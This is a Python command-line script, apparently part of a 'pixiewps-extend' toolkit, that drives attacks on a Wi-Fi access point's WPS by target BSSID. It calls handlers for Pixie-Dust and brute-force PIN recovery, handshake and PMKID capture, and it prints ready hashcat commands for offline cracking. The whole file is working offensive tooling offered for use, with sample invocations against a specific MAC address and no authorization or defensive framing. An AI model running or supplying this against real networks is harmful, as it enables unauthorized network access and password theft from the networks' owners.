#!/usr/bin/env python3
"""
WPS Attack Master Script - Full Integration with pixiewps-extend
Usage: python3 wps_attack.py <BSSID> [options]

This script will prefer to use an external AdvancedWPSAttacker implementation
(if pixiewps-extend or another integration exists in the runtime environment).
If not found, it will fall back to the local enhanced_wps_attack.WPSAttackHandler
that implements multiple fallback strategies (pixiewps --force, common pins,
handshake capture, PMKID extraction).
"""

import sys
import argparse
from pathlib import Path
import shutil

# Make sure local scripts directory is on sys.path (so enhanced_wps_attack can be imported)
sys.path.insert(0, str(Path(__file__).resolve().parent))

# Try to import AdvancedWPSAttacker (from pixiewps-extend integration) if available
USE_ADVANCED = False
AdvancedWPSAttacker = None
WPSTarget = None
try:
    # This import will succeed if the user installed or vendored an advanced_attack module
    from advanced_attack import AdvancedWPSAttacker, WPSTarget  # type: ignore
    USE_ADVANCED = True
except Exception:
    # Fall-back to local enhanced handler
    try:
        from enhanced_wps_attack import WPSAttackHandler  # type: ignore
    except Exception:
        WPSAttackHandler = None


def validate_bssid(bssid: str) -> bool:
    """Simple BSSID validation: XX:XX:XX:XX:XX:XX"""
    return len(bssid) == 17 and bssid.count(':') == 5


def main():
    parser = argparse.ArgumentParser(
        description="Advanced WPS Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack on specific target
  python3 wps_attack.py 98:03:8E:81:C1:F6

  # With custom interface and threading
  python3 wps_attack.py 98:03:8E:81:C1:F6 -i wlan0mon -t 8

  # Full brute-force (slow)
  python3 wps_attack.py 98:03:8E:81:C1:F6 --full-brute

  # Capture only (handshake/PMKID for offline)
  python3 wps_attack.py 98:03:8E:81:C1:F6 --capture-only
        """
    )

    parser.add_argument("bssid", help="Target BSSID (MAC address)")
    parser.add_argument("-i", "--interface", default="wlan0mon",
                        help="Wireless interface (default: wlan0mon)")
    parser.add_argument("-e", "--essid", default="Target",
                        help="Network ESSID")
    parser.add_argument("-c", "--channel", type=int, default=6,
                        help="Wireless channel (default: 6)")
    parser.add_argument("-s", "--signal", type=int, default=-50,
                        help="Signal strength in dBm (default: -50)")
    parser.add_argument("-t", "--threads", type=int, default=4,
                        help="Number of brute-force threads (default: 4)")
    parser.add_argument("--timeout", type=int, default=3600,
                        help="Overall timeout in seconds (default: 3600)")
    parser.add_argument("--full-brute", action="store_true",
                        help="Brute-force all PINs 0-99999999 (very slow)")
    parser.add_argument("--capture-only", action="store_true",
                        help="Only capture handshake/PMKID, skip PIN attacks")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Quiet mode (errors only)")
    parser.add_argument("-v", "--verbose", action="store_true", default=True,
                        help="Verbose output (default)")

    args = parser.parse_args()

    # Validate BSSID format
    if not validate_bssid(args.bssid):
        print("[-] Invalid BSSID format. Use: XX:XX:XX:XX:XX:XX")
        sys.exit(1)

    # If advanced integration is available, prefer it
    if USE_ADVANCED:
        print("[i] Using external AdvancedWPSAttacker from advanced_attack module")
        # Build a simple WPSTarget if not provided by that module
        try:
            tgt = WPSTarget(
                bssid=args.bssid,
                essid=args.essid,
                channel=args.channel,
                signal=args.signal,
                manufacturer="Unknown",
                model="Unknown",
                is_wps_enabled=True,
            )
        except Exception:
            # fallback simple dict/namespace
            class _T: pass
            tgt = _T()
            tgt.bssid = args.bssid
            tgt.essid = args.essid
            tgt.channel = args.channel
            tgt.signal = args.signal

        attacker = AdvancedWPSAttacker(args.interface, verbose=not args.quiet)
        try:
            result = attacker.attack_sequence(tgt)
            if result and result.get("success"):
                print(f"\n[+] SUCCESS! PIN: {result.get('pin')}")
                print(f"[+] Method: {result.get('method')}")
            else:
                print("\n[!] PIN not found, showing available artifacts (if any):")
                if result:
                    if result.get("handshake"):
                        print(f"    Handshake: {result['handshake']}")
                    if result.get("pmkid"):
                        print(f"    PMKID: {result['pmkid']}")
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Advanced attack error: {e}")
            sys.exit(1)
        return

    # No external advanced attacker: try local fallback handler
    if WPSAttackHandler is None:
        print("[-] No advanced_attack module and local fallback handler not found.")
        print("[i] Add pixiewps-extend/advanced_attack to PYTHONPATH or install dependencies.")
        sys.exit(1)

    handler = WPSAttackHandler(args.interface, verbose=not args.quiet)

    try:
        if args.capture_only:
            # run only capture methods
            res_hs = handler.capture_handshake(args.bssid, args.essid, args.channel, timeout=25)
            res_pk = handler.extract_pmkid(args.bssid, args.essid, timeout=15)
            result = {
                'success': False,
                'pin': None,
                'handshake': res_hs.get('handshake') if res_hs else None,
                'pmkid': res_pk.get('pmkid') if res_pk else None,
                'alternatives': [r for r in (res_hs, res_pk) if r],
            }
        else:
            # Try comprehensive attack (pixiewps fields may be empty if not collected)
            result = handler.comprehensive_attack(
                bssid=args.bssid,
                essid=args.essid,
                channel=args.channel,
                pke=None, pkr=None, e_hash1=None, e_hash2=None, authkey=None, e_nonce=None,
            )

        # Print results
        if result.get('success'):
            print(f"\n[+] SUCCESS! PIN: {result.get('pin')}")
            print(f"[+] Method: {result.get('method')}")
        else:
            print("\n[!] PIN not found. Alternatives / captured artifacts:")
            if result.get('handshake'):
                print(f"    Handshake: {result['handshake']}")
                print(f"    Command: hashcat -m 22000 {result['handshake']} wordlist.txt")
            if result.get('pmkid'):
                print(f"    PMKID: {result['pmkid']}")
                print(f"    Command: hashcat -m 16800 {result['pmkid']} wordlist.txt")
            if result.get('alternatives'):
                print(f"    Alternatives: {len(result['alternatives'])} option(s)")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
